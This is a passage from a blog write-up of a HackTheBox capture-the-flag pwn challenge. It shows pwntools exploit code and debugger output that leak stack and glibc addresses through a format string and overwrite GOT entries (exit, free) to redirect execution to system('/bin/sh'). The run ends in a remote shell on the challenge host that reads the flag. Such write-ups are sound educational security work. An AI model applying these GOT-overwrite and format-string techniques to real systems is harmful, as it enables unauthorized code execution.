<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'New username size: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'256'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter your new username: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Option [1-5]: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'5'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'New role: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span>()
</code></pre></div><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>I found a way to leak a stack address using this procedure:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './control_room'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './control_room': pid 264046  
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-dark-green">+</span>] New role has been set successfully!

<span class="code-dark-red">┌───────────────┬────────┐</span>
<span class="code-dark-red">│ Control Panel │ 9A0:F3 │</span>
<span class="code-dark-red">├───────────────┴────────┤</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ Technician:            │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 1. Configure Engine    │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 2. Check Engine        │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ Captain:               │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 3. Set route           │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 4. View route          │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 5. Change roles        │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">└────────────────────────┘</span>

[<span class="code-dark-blue">*</span>] Current Role: Technician

<span class="code-white">Option [1-5]: <span class="code-red">$</span> 1
selection: 1

Engine number [0-3]: <span class="code-red">$</span> 9
<span class="code-red">$</span>

Do you want to save the configuration? (y/n)
&gt; <span class="code-red">$</span> y
[<span class="code-dark-green">+</span>] Engine configuration updated successfully!


<span class="code-dark-red">┌────\xe2\xc0~\xa7\xd1\xfd\x7f</span>

[<span class="code-dark-blue">*</span>] Current Role: Technician

<span class="code-white">Option [1-5]: <span class="code-red">$</span>
</code></pre></div><p>This is interesting but it was not needed.</p><p>To leak addresses within Glibc, my approach was to use <code>printf</code> somewhere where I can control the first parameter. The only function that I found that didn&rsquo;t break the program was <code>free</code> in <code>user_edit</code>. Now the problem is to call <code>user_edit</code>. What I did was set the address of <code>user_edit</code> in the GOT entry for <code>exit</code>.</p><p>So, using an invalid option, the program will go to <code>user_edit</code>, we will enter a format string payload to leak values from the stack and instead of <code>free</code>, the program will call <code>printf</code> on that, showing the addresses on screen. After that, the program will go again to the menu.</p><p>The choice of <code>exit</code> and <code>free</code> was really good because they used very little in the main functionality of the program. Let&rsquo;s debug a bit:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">write_what_where</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, (</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.user_edit, </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.user_edit), </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.exit)</span>  
<span class="mtk1">    </span><span class="mtk8">write_what_where</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, (</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">plt</span><span class="mtk1">.printf, </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">plt</span><span class="mtk1">.printf), </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.free)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './control_room'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './control_room': pid 271041
[<span class="code-blue">*</span>] Leaked stack address: 0x7ffc032390c0
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './control_room', '271041', '-x', '/tmp/pwnfgdjd8xj.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-dark-green">+</span>] Engine configuration updated successfully!


<span class="code-dark-red">┌────\xe2\xc0\x90#\x03\x7f</span>

[<span class="code-dark-blue">*</span>] Current Role: Technician

<span class="code-white">Option [1-5]: <span class="code-red">$</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>got

GOT protection: Partial RelRO | GOT functions: 20

[0x405018] <span class="code-dark-yellow">free@GLIBC_2.2.5  →  0x4011e4</span>
[0x405020] <span class="code-dark-green">strncpy@GLIBC_2.2.5  →  0x7f038ad1c430</span>
[0x405028] <span class="code-dark-green">puts@GLIBC_2.2.5  →  0x7f038abe9ed0</span>
[0x405030] <span class="code-dark-green">fread@GLIBC_2.2.5  →  0x7f038abe8bb0</span>
[0x405038] <span class="code-dark-green">fclose@GLIBC_2.2.5  →  0x7f038abe7cf0</span>
[0x405040] <span class="code-dark-green">strlen@GLIBC_2.2.5  →  0x7f038ad1b220</span>
[0x405048] <span class="code-dark-yellow">__stack_chk_fail@GLIBC_2.4  →  0x401090</span>
[0x405050] <span class="code-dark-green">printf@GLIBC_2.2.5  →  0x7f038abc9770</span>
[0x405058] <span class="code-dark-green">memset@GLIBC_2.2.5  →  0x7f038ad18b40</span>
[0x405060] <span class="code-dark-green">strcspn@GLIBC_2.2.5  →  0x7f038ad01730</span>
[0x405068] <span class="code-dark-green">fgets@GLIBC_2.2.5  →  0x7f038abe8400</span>
[0x405070] <span class="code-dark-green">strcmp@GLIBC_2.2.5  →  0x7f038ad1a960</span>
[0x405078] <span class="code-dark-green">getchar@GLIBC_2.2.5  →  0x7f038abf0b60</span>
[0x405080] <span class="code-dark-green">fprintf@GLIBC_2.2.5  →  0x7f038abc96b0</span>
[0x405088] <span class="code-dark-green">malloc@GLIBC_2.2.5  →  0x7f038ac0e120</span>
[0x405090] <span class="code-dark-green">setvbuf@GLIBC_2.2.5  →  0x7f038abea670</span>
[0x405098] <span class="code-dark-green">fopen@GLIBC_2.2.5  →  0x7f038abe86b0</span>
[0x4050a0] <span class="code-dark-green">atoi@GLIBC_2.2.5  →  0x7f038abac640</span>
[0x4050a8] <span class="code-dark-green">__isoc99_scanf@GLIBC_2.7  →  0x7f038abcb110</span>  
[0x4050b0] <span class="code-dark-yellow">exit@GLIBC_2.2.5  →  0x4018ed</span>
<span class="code-green">gef➤  </span>x 0x4018ed
<span class="code-dark-blue">0x4018ed</span> &lt;<span class="code-dark-yellow">user_edit</span>&gt;:   0xfa1e0ff3
<span class="code-green">gef➤  </span>x 0x4011e4
<span class="code-dark-blue">0x4011e4</span> &lt;<span class="code-dark-yellow">printf@plt</span>+4&gt;:        0x6525fff2
</code></pre></div><p>Alright, so if we use an invalid option we will go to <code>user_edit</code>, and our username will go to <code>printf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-white">Option [1-5]: <span class="code-red">$</span> 0
selection: 0
[<span class="code-dark-red">!</span>] Invalid option

&lt;===[ Edit Username ]===&gt;

New username size: <span class="code-red">$</span> 200

Enter your new username: <span class="code-red">$</span> %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.
[<span class="code-dark-green">+</span>] User updated successfully!

7ffc03236f60.0.7f038ac7da37.2b.7fffffff.100032390c0.1ce75a0.7ffc032390e0.4020ba.10000000000.0.7ffc03239110.40218c.7ffc03239228.100000000.4100000000.38550201c8808c00.1.7f038ab92d90.0.4020bf.100000000.7ffc03239228.0.91ff312e9fcd604e.  
<span class="code-dark-red">┌────\xe2\xc0\x90#\x03\x7f</span>

[<span class="code-dark-blue">*</span>] Current Role: Technician

<span class="code-white">Option [1-5]: <span class="code-red">$</span>
</code></pre></div><p>Perfect, we have a Glibc address at the third place. Let&rsquo;s see which function is that using GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x 0x7f038ac7da37
<span class="code-dark-blue">0x7f038ac7da37</span> &lt;<span class="code-dark-yellow">write</span>+23&gt;:      0xf0003d48  
</code></pre></div><p>Ok, <code>write+23</code>. With this, we can now rebase Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Option [1-5]: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'0'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'New username size: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'200'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter your new username: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'%3$lx'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'User updated successfully!</span><span class="mtk6">\n\n</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">write_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">decode</span><span class="mtk1">()[:</span><span class="mtk6">12</span><span class="mtk1">], </span><span class="mtk6">16</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">23</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked write() address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">write_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">write_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.write</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>And everything is working smoothly since the Glibc address looks fine (ending in <code>000</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './control_room'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './control_room': pid 276836  
[<span class="code-blue">*</span>] Leaked stack address: 0x7ffc63012350
[<span class="code-blue">*</span>] Leaked write() address: 0x7f39268c1a20
[<span class="code-green">+</span>] Glibc base address: 0x7f39267ad000
[<span class="code-blue">*</span>] Switching to interactive mode
┌────\xe2P#c\xfc

[<span class="code-dark-blue">*</span>] Current Role: Technician

<span class="code-white">Option [1-5]: <span class="code-red">$</span>
</code></pre></div><h3 id="getting-rce">Getting RCE</h3><p>At this point, we can use GOT overwrite again to set <code>free</code> to <code>system</code> and enter <code>/bin/sh</code> as new username:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">write_what_where</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, (</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system, </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system), </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.free)</span>  
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Option [1-5]: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'0'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'New username size: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'200'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter your new username: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>And with this, we have a shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './control_room'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './control_room': pid 287290
[<span class="code-blue">*</span>] Leaked stack address: 0x7ffcc72eb860
[<span class="code-blue">*</span>] Leaked write() address: 0x7f59718dda20
[<span class="code-green">+</span>] Glibc base address: 0x7f59717c9000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
banner.txt  control_room  ld-linux-x86-64.so.2    libc.so.6  solve.py  
</code></pre></div><h2 id="flag">Flag</h2><p>Let&rsquo;s go remote:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 161.35.34.21:31114
[<span class="code-blue">*</span>] './control_room_test'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Opening connection to 161.35.34.21 on port 31114: Done  
[<span class="code-blue">*</span>] Leaked stack address: 0x7ffe64a88bb0
[<span class="code-blue">*</span>] Leaked write() address: 0x7fac80a6fa20
[<span class="code-green">+</span>] Glibc base address: 0x7fac8095b000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
banner.txt
challenge
flag.txt
libc.so.6
<span class="code-red">$</span> cat flag.txt
HTB{b00m_b00m_fr0m_th3_c0ntr0l_r00m}
</code></pre></div><p>The full exploit code is here: <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Control%20Room/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#setup-environment">Setup environment</a></li><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#switching-roles">Switching roles</a></li><li><a href="#captain-options">Captain options</a></li><li><a href="#technician-options">Technician options</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>